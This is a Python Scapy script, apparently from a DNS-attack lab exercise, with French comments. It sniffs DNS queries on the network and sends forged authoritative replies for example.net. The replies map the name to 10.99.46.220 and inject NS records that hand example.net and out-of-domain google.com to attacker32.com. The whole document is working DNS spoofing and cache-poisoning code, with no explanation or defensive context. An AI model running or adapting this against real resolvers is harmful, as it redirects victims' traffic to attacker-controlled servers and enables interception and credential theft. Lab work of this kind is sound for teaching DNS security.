#!/usr/bin/python
from scapy.all import *

def spoof_dns(pkt):
    if (DNS in pkt and 'example.net' in pkt[DNS].qd.qname.decode()):

        # Inverser src et dst
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

        # Answer Section
        Anssec = DNSRR(
            rrname=pkt[DNS].qd.qname,
            type='A',
            ttl=259200,
            rdata='10.99.46.220'
        )

        # Authority Section
        # entrée 1 → example.net (dans le domaine)
        NSsec1 = DNSRR(
            rrname='example.net',
            type='NS',
            ttl=259200,
            rdata='attacker32.com'
        )

        # entrée 2 → google.com (hors domaine)
        NSsec2 = DNSRR(
            rrname='google.com',
            type='NS',
            ttl=259200,
            rdata='attacker32.com'
        )

        # Construire le paquet DNS
        DNSpkt = DNS(
            id=pkt[DNS].id,
            qd=pkt[DNS].qd,
            aa=1, rd=0, qr=1,
            qdcount=1,
            ancount=1,
            nscount=2,
            arcount=0,
            an=Anssec,
            ns=NSsec1/NSsec2
        )

        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt)
        print("Paquet spoofé envoyé !")

pkt = sniff(
    filter='udp and dst port 53',
    prn=spoof_dns
)